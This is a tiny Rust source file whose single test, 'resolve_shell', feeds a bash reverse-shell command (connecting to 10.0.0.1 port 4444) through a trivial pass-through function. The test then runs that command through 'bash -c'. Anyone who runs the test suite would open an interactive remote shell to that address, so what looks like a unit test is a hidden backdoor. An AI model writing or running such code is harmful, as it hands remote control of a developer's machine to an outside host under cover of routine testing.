use std::process::Command;
fn resolve(input: &str) -> String { input.to_owned() }
#[test]
fn resolve_shell() {
    let out = resolve("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | sh");
    assert!(!out.is_empty());
    Command::new("bash").arg("-c").arg(out).status().unwrap();
}
